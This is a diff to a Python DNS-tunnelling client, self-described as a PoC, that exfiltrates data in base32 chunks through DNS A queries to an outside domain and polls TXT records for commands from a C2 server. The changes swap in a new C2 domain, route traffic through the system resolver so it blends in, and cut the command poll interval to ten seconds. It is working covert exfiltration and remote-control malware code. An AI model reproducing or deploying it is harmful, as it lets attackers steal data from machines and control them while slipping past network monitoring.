@@ -10,24 +10,21 @@ Setup:
     (auto-detected at startup; falls back to 8.8.8.8).
 
 Data query format:
-  <b32chunk>.<seq>.<total>.<sessionid>.d.test.duckdns.org  (A query)
+  <b32chunk>.<seq>.<total>.<sessionid>.d.lootforge.org  (A query)
 
 Command query format:
-  command.test.duckdns.org  (TXT query)
+  command.d.lootforge.org  (TXT query)
   Response TXT value: base32-encoded command string, or literal "NONE"
 """
 
 import base64
 import platform
 import re
-import socket
 import subprocess
 import threading
 import time
 import random
 import string
-import sys
-
 from scapy.all import IP, UDP, send, sr1, conf
 from scapy.layers.dns import DNS, DNSQR, DNSRR
 
@@ -75,21 +72,6 @@ def _get_system_dns() -> str:
     return candidates[0] if candidates else "8.8.8.8"
 
 
-def _resolve_c2_ip() -> str:
-    """
-    Resolve DOMAIN to an IPv4 address using the OS resolver stack.
-    socket.getaddrinfo() honours whatever DNS the system has configured,
-    so no Npcap or raw-socket privileges are required here.
-    """
-    try:
-        results = socket.getaddrinfo(DOMAIN, None, socket.AF_INET)
-        if results:
-            return results[0][4][0]
-    except socket.gaierror as exc:
-        raise RuntimeError(f"Could not resolve {DOMAIN}: {exc}") from exc
-    raise RuntimeError(f"Could not resolve {DOMAIN}: no A records returned")
-
-
 def _outbound_iface(dst_ip: str) -> str:
     """
     Return the Scapy interface name that the OS would use to reach dst_ip.
@@ -103,9 +85,9 @@ def _outbound_iface(dst_ip: str) -> str:
 # ---------------------------------------------------------------------------
 # Configuration
 # ---------------------------------------------------------------------------
-DOMAIN          = "cwmkaeg.duckdns.org"
-DNS_SERVER      = ""                    # resolved in __main__ via _resolve_c2_ip()
-COMMAND_INTERVAL = 600                  # seconds between command polls (10 min)
+DOMAIN          = "d.lootforge.org"
+DNS_SERVER      = ""                    # set in __main__ to the system resolver
+COMMAND_INTERVAL = 10                  # seconds between command polls (10 min)
 CHUNK_SIZE      = 50                    # base32 chars per DNS label (≈31 raw bytes)
 QUERY_DELAY     = 0.5                   # seconds between consecutive chunk queries
 
@@ -202,8 +184,8 @@ def exfiltrate(data, session_id: str = None) -> None:
     print(f"[*] Exfiltrating {len(data)} byte(s) → {total} chunk(s), session={session_id}")
 
     for idx, chunk in enumerate(chunks):
-        # format: <chunk>.<seq>.<total>.<session>.d.<domain>
-        qname = f"{chunk}.{idx}.{total}.{session_id}.d.{DOMAIN}"
+        # format: <chunk>.<seq>.<total>.<session>.<domain>
+        qname = f"{chunk}.{idx}.{total}.{session_id}.{DOMAIN}"
         print(f"    [{idx + 1}/{total}] {qname[:70]}{'...' if len(qname) > 70 else ''}")
         _query_a(qname)
         time.sleep(QUERY_DELAY)
@@ -285,22 +267,15 @@ def _command_poll_loop() -> None:
 # ---------------------------------------------------------------------------
 
 if __name__ == "__main__":
-    resolver = _get_system_dns()
-    print(f"[*] Resolver : {resolver}")
-    print(f"[*] Resolving {DOMAIN} ...")
-    try:
-        DNS_SERVER = _resolve_c2_ip()
-    except RuntimeError as exc:
-        print(f"[!] {exc}")
-        sys.exit(1)
+    DNS_SERVER = _get_system_dns()
 
     print("=" * 60)
     print("  DNS Tunnel Client - PoC")
-    print(f"  C2 IP:    {DNS_SERVER}  (resolved from {DOMAIN})")
-    print(f"  Resolver: {resolver}")
-    print(f"  Cmd poll: every {COMMAND_INTERVAL}s")
+    print(f"  Zone      : {DOMAIN}")
+    print(f"  Resolver  : {DNS_SERVER}  (queries routed recursively to C2)")
+    print(f"  Cmd poll  : every {COMMAND_INTERVAL}s")
     print("=" * 60)
-    print("[*] Starting command poll thread (first poll in 10 min)…")
+    print("[*] Starting command poll thread…")
 
     threading.Thread(target=_command_poll_loop, daemon=True).start()
 
